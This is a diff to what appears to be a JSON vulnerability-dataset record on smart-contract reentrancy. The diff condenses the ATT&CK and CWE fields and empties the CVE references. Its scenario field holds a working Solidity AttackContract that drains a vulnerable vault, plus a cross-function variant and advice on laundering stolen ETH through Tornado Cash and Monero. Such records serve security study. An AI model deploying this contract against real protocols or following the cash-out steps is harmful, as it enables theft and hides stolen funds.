@@ -25,50 +25,15 @@
       "A08:2021-Software and Data Integrity Failures"
     ],
     "mitre_attack": [
-      {
-        "tactic": "TA0040",
-        "tactic_name": "Impact",
-        "technique": "T1499",
-        "technique_name": "Endpoint Denial of Service",
-        "subtechnique": "T1499.004",
-        "subtechnique_name": "Application or System Exploitation"
-      },
-      {
-        "tactic": "TA0042",
-        "tactic_name": "Resource Development",
-        "technique": "T1587",
-        "technique_name": "Develop Capabilities",
-        "subtechnique": "T1587.001",
-        "subtechnique_name": "Malware"
-      },
-      {
-        "tactic": "TA0009",
-        "tactic_name": "Collection",
-        "technique": "T1530",
-        "technique_name": "Data from Cloud Storage Object"
-      }
+      "T1499",
+      "T1587",
+      "T1530"
     ],
     "cwe": [
-      {
-        "id": "CWE-841",
-        "name": "Improper Enforcement of Behavioral Workflow",
-        "description": "The software supports a session in which more than one behavior must be performed by an actor, but it does not properly ensure that the actor performs the behaviors in the required sequence."
-      },
-      {
-        "id": "CWE-362",
-        "name": "Concurrent Execution using Shared Resource with Improper Synchronization (Race Condition)",
-        "description": "The program contains a code sequence that can run concurrently with other code, and the code sequence requires temporary, exclusive access to a shared resource, but a timing window exists in which the shared resource can be modified by another code sequence that is operating concurrently."
-      },
-      {
-        "id": "CWE-691",
-        "name": "Insufficient Control Flow Management",
-        "description": "The code does not sufficiently manage its control flow during execution, creating conditions in which the control flow can be modified in unexpected ways."
-      },
-      {
-        "id": "CWE-670",
-        "name": "Always-Incorrect Control Flow Implementation",
-        "description": "The code contains a control flow path that does not reflect the algorithm that the path is intended to implement, leading to incorrect behavior any time the path is navigated."
-      }
+      "CWE-841",
+      "CWE-362",
+      "CWE-691",
+      "CWE-670"
     ]
   },
   "threat": {
@@ -126,7 +91,7 @@
     ]
   },
   "attack": {
-    "scenario": "**Phase 1: Reconnaissance and Vulnerability Identification**\n\nThe attacker, a sophisticated blockchain security researcher turned malicious actor, begins by analyzing popular DeFi protocols for reentrancy vulnerabilities. Using automated scanning tools like Slither and Mythril, they identify a high-value lending protocol called 'YieldVault' that has $50 million in total value locked (TVL). The protocol allows users to deposit ETH and earn interest on their deposits.\n\nThe attacker discovers that the YieldVault contract's `withdraw()` function follows this vulnerable pattern:\n\n```solidity\nfunction withdraw(uint256 _amount) public {\n    require(balances[msg.sender] >= _amount, \"Insufficient balance\");\n    \n    // VULNERABILITY: External call before state update\n    (bool success, ) = msg.sender.call{value: _amount}(\"\");\n    require(success, \"Transfer failed\");\n    \n    // State update happens AFTER external call\n    balances[msg.sender] -= _amount;\n}\n```\n\nThe critical flaw is that the contract sends ETH to the caller before updating the internal balance mapping. This violates the Checks-Effects-Interactions pattern.\n\n**Phase 2: Attack Contract Development**\n\nThe attacker develops a malicious contract called AttackContract with a fallback function that will be triggered when receiving ETH:\n\n```solidity\ncontract AttackContract {\n    YieldVault public victim;\n    uint256 public constant ATTACK_AMOUNT = 10 ether;\n    uint256 public attackCount = 0;\n    uint256 public maxAttacks = 5;\n    \n    constructor(address _victimAddress) {\n        victim = YieldVault(_victimAddress);\n    }\n    \n    // Initial deposit to satisfy balance check\n    function deposit() public payable {\n        victim.deposit{value: msg.value}();\n    }\n    \n    // Trigger the attack\n    function attack() public {\n        victim.withdraw(ATTACK_AMOUNT);\n    }\n    \n    // Fallback function - called when receiving ETH\n    receive() external payable {\n        attackCount++;\n        if (attackCount < maxAttacks && address(victim).balance >= ATTACK_AMOUNT) {\n            // Reenter the withdraw function\n            victim.withdraw(ATTACK_AMOUNT);\n        }\n    }\n    \n    // Collect stolen funds\n    function collectFunds() public {\n        payable(msg.sender).transfer(address(this).balance);\n    }\n}\n```\n\n**Phase 3: Attack Execution**\n\nThe attacker follows these steps:\n\n1. **Day 1 - Preparation**: Deploy AttackContract to Ethereum mainnet. Gas cost: ~0.5 ETH\n\n2. **Day 2 - Initial Deposit**: Call `deposit()` with 10 ETH to establish a legitimate balance in YieldVault. This satisfies the `require(balances[msg.sender] >= _amount)` check.\n\n3. **Day 3 - The Attack**: Call `attack()` function at 2:00 AM UTC (low network activity for faster execution):\n   - First `withdraw(10 ETH)` call enters YieldVault\n   - YieldVault checks: `balances[attacker] = 10 ETH >= 10 ETH` ✓\n   - YieldVault sends 10 ETH to AttackContract\n   - AttackContract's `receive()` function is triggered\n   - **REENTRANCY**: `receive()` calls `withdraw(10 ETH)` again\n   - YieldVault checks: `balances[attacker] = 10 ETH >= 10 ETH` ✓ (still not updated!)\n   - YieldVault sends another 10 ETH to AttackContract\n   - This repeats 5 times before gas limits are reached\n   - Only after all recursive calls complete does the original call update: `balances[attacker] -= 10 ETH`\n\n4. **Result**: Attacker withdraws 50 ETH (5 × 10 ETH) but only had a 10 ETH deposit. Net profit: 40 ETH (~$80,000 at $2,000/ETH).\n\n**Phase 4: Cross-Function Reentrancy Escalation**\n\nIf the victim contract has multiple functions that check the same balance, the attack becomes more sophisticated:\n\n```solidity\nfunction withdraw(uint256 _amount) public {\n    require(balances[msg.sender] >= _amount);\n    (bool success, ) = msg.sender.call{value: _amount}(\"\");\n    require(success);\n    balances[msg.sender] -= _amount;\n}\n\nfunction transfer(address _to, uint256 _amount) public {\n    require(balances[msg.sender] >= _amount);\n    balances[msg.sender] -= _amount;\n    balances[_to] += _amount;\n}\n```\n\nThe attacker modifies their receive function:\n\n```solidity\nreceive() external payable {\n    if (attackCount == 0) {\n        // First callback: call different function\n        victim.transfer(attackerEOA, ATTACK_AMOUNT);\n    } else if (attackCount < maxAttacks) {\n        victim.withdraw(ATTACK_AMOUNT);\n    }\n    attackCount++;\n}\n```\n\nThis cross-function reentrancy can bypass naive guards that only protect individual functions.\n\n**Phase 5: Cover Tracks and Cash Out**\n\n1. Call `collectFunds()` to transfer all stolen ETH from AttackContract to a fresh address\n2. Use Tornado Cash or another mixer to obscure the trail (though this is increasingly tracked by law enforcement)\n3. Convert to privacy coins (Monero) via decentralized exchanges\n4. The entire attack completes in a single transaction block, often before monitoring systems can alert the protocol team\n\n**Real-World Impact**: Within minutes of the attack, YieldVault's TVL drops from $50M to $49.92M. The protocol's governance token crashes 35% as news spreads on Twitter. The team must pause the contract, conduct a post-mortem, and potentially reimburse users from treasury funds.",
+    "scenario": "**Phase 1: Reconnaissance and Vulnerability Identification**\n\nThe attacker, a sophisticated blockchain security researcher turned malicious actor, begins by analyzing popular DeFi protocols for reentrancy vulnerabilities. Using automated scanning tools like Slither and Mythril, they identify a high-value lending protocol called 'YieldVault' that has $50 million in total value locked (TVL). The protocol allows users to deposit ETH and earn interest on their deposits.\n\nThe attacker discovers that the YieldVault contract's `withdraw()` function follows this vulnerable pattern:\n\n```solidity\nfunction withdraw(uint256 _amount) public {\n    require(balances[msg.sender] >= _amount, \"Insufficient balance\");\n    \n    // VULNERABILITY: External call before state update\n    (bool success, ) = msg.sender.call{value: _amount}(\"\");\n    require(success, \"Transfer failed\");\n    \n    // State update happens AFTER external call\n    balances[msg.sender] -= _amount;\n}\n```\n\nThe critical flaw is that the contract sends ETH to the caller before updating the internal balance mapping. This violates the Checks-Effects-Interactions pattern.\n\n**Phase 2: Attack Contract Development**\n\nThe attacker develops a malicious contract called AttackContract with a fallback function that will be triggered when receiving ETH:\n\n```solidity\ncontract AttackContract {\n    YieldVault public victim;\n    uint256 public constant ATTACK_AMOUNT = 10 ether;\n    uint256 public attackCount = 0;\n    uint256 public maxAttacks = 5;\n    \n    constructor(address _victimAddress) {\n        victim = YieldVault(_victimAddress);\n    }\n    \n    // Initial deposit to satisfy balance check\n    function deposit() public payable {\n        victim.deposit{value: msg.value}();\n    }\n    \n    // Trigger the attack\n    function attack() public {\n        victim.withdraw(ATTACK_AMOUNT);\n    }\n    \n    // Fallback function - called when receiving ETH\n    receive() external payable {\n        attackCount++;\n        if (attackCount < maxAttacks && address(victim).balance >= ATTACK_AMOUNT) {\n            // Reenter the withdraw function\n            victim.withdraw(ATTACK_AMOUNT);\n        }\n    }\n    \n    // Collect stolen funds\n    function collectFunds() public {\n        payable(msg.sender).transfer(address(this).balance);\n    }\n}\n```\n\n**Phase 3: Attack Execution**\n\nThe attacker follows these steps:\n\n1. **Day 1 - Preparation**: Deploy AttackContract to Ethereum mainnet. Gas cost: ~0.5 ETH\n\n2. **Day 2 - Initial Deposit**: Call `deposit()` with 10 ETH to establish a legitimate balance in YieldVault. This satisfies the `require(balances[msg.sender] >= _amount)` check.\n\n3. **Day 3 - The Attack**: Call `attack()` function at 2:00 AM UTC (low network activity for faster execution):\n   - First `withdraw(10 ETH)` call enters YieldVault\n   - YieldVault checks: `balances[attacker] = 10 ETH >= 10 ETH` \u2713\n   - YieldVault sends 10 ETH to AttackContract\n   - AttackContract's `receive()` function is triggered\n   - **REENTRANCY**: `receive()` calls `withdraw(10 ETH)` again\n   - YieldVault checks: `balances[attacker] = 10 ETH >= 10 ETH` \u2713 (still not updated!)\n   - YieldVault sends another 10 ETH to AttackContract\n   - This repeats 5 times before gas limits are reached\n   - Only after all recursive calls complete does the original call update: `balances[attacker] -= 10 ETH`\n\n4. **Result**: Attacker withdraws 50 ETH (5 \u00d7 10 ETH) but only had a 10 ETH deposit. Net profit: 40 ETH (~$80,000 at $2,000/ETH).\n\n**Phase 4: Cross-Function Reentrancy Escalation**\n\nIf the victim contract has multiple functions that check the same balance, the attack becomes more sophisticated:\n\n```solidity\nfunction withdraw(uint256 _amount) public {\n    require(balances[msg.sender] >= _amount);\n    (bool success, ) = msg.sender.call{value: _amount}(\"\");\n    require(success);\n    balances[msg.sender] -= _amount;\n}\n\nfunction transfer(address _to, uint256 _amount) public {\n    require(balances[msg.sender] >= _amount);\n    balances[msg.sender] -= _amount;\n    balances[_to] += _amount;\n}\n```\n\nThe attacker modifies their receive function:\n\n```solidity\nreceive() external payable {\n    if (attackCount == 0) {\n        // First callback: call different function\n        victim.transfer(attackerEOA, ATTACK_AMOUNT);\n    } else if (attackCount < maxAttacks) {\n        victim.withdraw(ATTACK_AMOUNT);\n    }\n    attackCount++;\n}\n```\n\nThis cross-function reentrancy can bypass naive guards that only protect individual functions.\n\n**Phase 5: Cover Tracks and Cash Out**\n\n1. Call `collectFunds()` to transfer all stolen ETH from AttackContract to a fresh address\n2. Use Tornado Cash or another mixer to obscure the trail (though this is increasingly tracked by law enforcement)\n3. Convert to privacy coins (Monero) via decentralized exchanges\n4. The entire attack completes in a single transaction block, often before monitoring systems can alert the protocol team\n\n**Real-World Impact**: Within minutes of the attack, YieldVault's TVL drops from $50M to $49.92M. The protocol's governance token crashes 35% as news spreads on Twitter. The team must pause the contract, conduct a post-mortem, and potentially reimburse users from treasury funds.",
     "prerequisites": [
       "Vulnerable smart contract deployed on EVM-compatible blockchain",
       "Contract must make external call (transfer, call, send) before updating state",
@@ -144,24 +109,7 @@
     "user_interaction": "None - Fully automated attack requiring no victim interaction"
   },
   "evidence": {
-    "cve_references": [
-      {
-        "id": "CVE-2023-39363",
-        "description": "Vyper compiler versions 0.2.15, 0.2.16, 0.3.0 through 0.3.7 contain a vulnerability where malfunctioning reentrancy guards allow external calls during the same transaction",
-        "severity": "Critical",
-        "cvss_score": 9.8,
-        "published_date": "2023-07-30",
-        "affected_versions": "Vyper 0.2.15, 0.2.16, 0.3.0-0.3.7",
-        "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-39363"
-      },
-      {
-        "id": "SWC-107",
-        "description": "Smart Contract Weakness Classification - Reentrancy",
-        "reference": "https://swcregistry.io/docs/SWC-107",
-        "category": "Solidity Best Practices",
-        "description_detail": "One of the most dangerous vulnerabilities in smart contracts. External calls can lead to unexpected code execution."
-      }
-    ],
+    "cve_references": [],
     "real_world_breaches": [
       {
         "name": "The DAO Hack",
